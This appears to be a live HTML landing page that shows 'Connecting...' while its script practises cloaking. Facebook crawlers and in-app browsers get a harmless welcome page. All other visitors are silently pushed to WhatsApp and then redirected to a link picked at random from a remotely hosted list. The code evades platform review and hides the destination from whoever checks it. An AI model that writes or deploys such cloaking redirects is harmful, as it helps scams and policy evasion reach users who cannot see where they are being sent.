<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <style>
    body { font-family: sans-serif; padding: 20px; }
  </style>
</head>
<body>
<h2>Connecting...</h2>
<p>Please wait...</p>

<script>
(async () => {
  const ua = navigator.userAgent || "";

  const isFB = 
    ua.includes("FBAN") || 
    ua.includes("FBAV") || 
    ua.includes("FB_IAB") ||
    ua.includes("Facebot") ||
    ua.includes("facebookexternalhit");

  if (isFB) {
    document.body.innerHTML = `
      <h2>Welcome</h2>
      <p>Thanks for visiting.</p>
    `;
    return;
  }

  const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";

  try {
    const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
    const data = await res.json();
    const activeLinks = data.links.filter(l => l.active);
    if (!activeLinks.length) {
      document.body.innerHTML = "No available service.";
      return;
    }

    const idx = Math.floor(Math.random() * activeLinks.length);
    const target = activeLinks[idx].url;

    // ========================
    // iPhone 处理：后台先唤醒 APP
    // ========================
    if (/iPhone|iPad|iPod/i.test(ua)) {
      // 先让 iPhone 静默尝试打开 APP，不显示弹窗
      let iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "whatsapp://";
      document.body.appendChild(iframe);

      // 如果失败就回跳网页
      setTimeout(() => {
        window.location = target;
      }, 1200);

      return;
    }

    // ========================
    // Android 处理：直接 APP 或网页
    // ========================
    window.location = "whatsapp://";

    setTimeout(() => {
      window.location = target;
    }, 700);

  } catch(e) {
    document.body.innerHTML = `Error loading service.`;
  }
})();
</script>

</body>
</html>
